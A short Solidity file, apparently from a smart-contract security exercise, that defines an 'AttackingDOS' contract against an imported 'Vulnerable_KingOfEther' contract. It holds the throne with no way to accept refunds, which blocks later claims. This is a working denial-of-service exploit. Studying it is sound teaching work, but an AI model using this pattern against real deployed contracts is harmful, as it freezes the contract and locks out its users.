//SPDX-License-Identifer:MIT

pragma solidity ^0.8.18;

import {KingOfEther} from "./Vulnerable_KingOfEther.sol";

contract AttackingDOS{
    KingOfEther public kingOfEther;

    constructor(address _addr){
        kingOfEther = KingOfEther(_addr);
    }
    function attack() public payable{
        kingOfEther.claimThrone{value: msg.value}();
    }
}